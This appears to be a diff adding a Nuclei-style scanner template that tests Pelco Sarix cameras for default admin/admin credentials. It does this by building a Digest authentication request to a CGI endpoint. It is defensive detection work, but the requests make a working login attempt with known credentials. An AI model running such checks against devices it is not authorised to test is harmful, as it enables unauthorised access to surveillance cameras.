@@ -1,0 +1,75 @@
+http:
+- extractors:
+  - group: 1
+    name: realm
+    part: header
+    regex:
+    - realm="([^"]+)"
+    type: regex
+  - group: 1
+    name: nonce
+    part: header
+    regex:
+    - nonce="([^"]+)"
+    type: regex
+  - group: 1
+    name: qop
+    part: header
+    regex:
+    - qop="([^"]+)"
+    type: regex
+  matchers:
+  - status:
+    - 401
+    type: status
+  - part: header
+    type: word
+    words:
+    - 'WWW-Authenticate: Digest'
+  matchers-condition: and
+  raw:
+  - 'GET /cgi-bin/get?system.access_level HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    type: word
+    words:
+    - system.access_level
+  matchers-condition: and
+  raw:
+  - 'GET /cgi-bin/get?system.access_level HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Authorization: Digest username="admin", realm="{{realm}}", nonce="{{nonce}}",
+    uri="/cgi-bin/get?system.access_level", qop={{qop}}, nc=00000001, cnonce="{{rand_base(8)}}",
+    response="{{md5(md5(''admin:{{realm}}:admin'') + '':'' + nonce + '':'' + ''00000001''
+    + '':'' + rand_base(8) + '':'' + qop + '':'' + md5(''GET:/cgi-bin/get?system.access_level''))}}"
+
+    '
+id: pelco-sarix-default-login-digest
+info:
+  author: tdiderich
+  classification:
+    cwe-id: CWE-798
+  description: 'Pelco Sarix camera default login credentials (admin/admin) were discovered
+    using Digest Authentication.
+
+    '
+  metadata:
+    max-request: 2
+    product: sarix
+    runzero-match: asset["hw"] matches "(i)Pelco Sarix"
+    vendor: pelco
+    verified: true
+  name: Pelco Sarix - Default Login
+  reference:
+  - https://support.pelco.com/s/article/Default-passwords-and-usernames-for-Digital-Sentry-DX-Endura-Sarix-and-VideoXpert-components-1538586718306?language=en_US
+  severity: high
+  tags: pelco,sarix,default-login
